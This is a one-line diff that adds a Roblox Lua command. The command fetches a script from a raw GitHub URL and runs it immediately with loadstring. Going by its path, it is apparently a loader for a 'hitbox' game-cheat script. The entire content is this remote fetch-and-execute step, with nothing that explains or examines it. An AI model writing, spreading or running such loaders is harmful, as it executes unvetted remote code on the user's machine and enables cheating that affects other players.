@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/hitbox-changes-azure-latch-spam6-s8ek6yavghqwob.lua"))()
